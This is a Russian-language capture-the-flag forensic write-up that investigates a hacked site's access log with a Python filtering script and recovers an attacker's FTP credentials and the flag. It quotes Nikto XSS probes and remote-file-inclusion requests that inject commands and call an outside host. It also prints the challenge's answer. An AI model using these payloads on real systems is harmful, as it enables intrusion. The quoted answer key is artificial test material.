# Forensic 100

**Author: Alexander Menshchikov (nostr) and Vlad Roskov (vos)**

Задача: Our website recently got hacked. Try to investigate the case.

Ну и ссылка на архив: https://hackyou.ctf.su/files/access.log.gz

**1. Начало**

Разархивируем архив и откроем файл access.log

Все содержимое выглядит примерно так:

```
127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /administrator/gallery/gallery.php?directory=\x5C\x22<script>alert(document.cookie)</script> HTTP/1.1" 404 168 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000712)"
127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /index.php?dir=<script>alert('Vulnerable')</script> HTTP/1.1" 404 168 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000713)"
127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /https-admserv/bin/index?/<script>alert(document.cookie)</script> HTTP/1.1" 404 168 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000714)"
127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /clusterframe.jsp?cluster=<script>alert(document.cookie)</script> HTTP/1.1" 404 168 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000715)"
127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /article.cfm?id=1'<script>alert(document.cookie);</script> HTTP/1.1" 404 168 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000716)"
```

Ну естественно возникает желание почистить логи.

**2. Чистка**

Быстренько накидываем скриптик на питоне. Также заметим, что некоторые ссылки претерпели urlencode, расшифруем их заодно.

Пробегаемся по логам и найдем те строки, которые нам надо обрезать.

```Python
from urllib import parse
f=open("access.log", "r")
lul=open("clear.log", "w")
for line in f:
    if "GET / " not in line and "nikto" not in line and "YandexBot" not in line and "GoogleBot" not in line and "Nikto" not in line and "nmap" not in line and "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" not in line and "Bot" not in line and "ZmEu" not in line:
        new_line=parse.unquote(line) # Раздекодим url
        if(line==new_line):
            lul.write(line)
        else:
            lul.write("\n"+parse.unquote(line)+"\n") # Ну и заодно выделим переходом те, которые расшифровали
```

**3. Ищем флаг**

Находим пару интересных логов, где происходит авторизация к фтп серверу.

```
127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=echo open hy17-evilftp.spb.ctf.su 11021 > c:\windows\temp\s.txt HTTP/1.1" 200 1533 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4"

127.0.0.1 - - [01/Jan/1970:00:00:00 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=echo jameed08>> c:\windows\temp\s.txt HTTP/1.1" 200 1507 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4"
```

**Host - hy17-evilftp.spb.ctf.su  
user - jameed08  
pass - correcthorsebatterystaple**

**4. Авторизуемся**

Подключаемся к фтп серверу, где находим пдф файл с флагом внутри.

**Flag: APACHE31337**
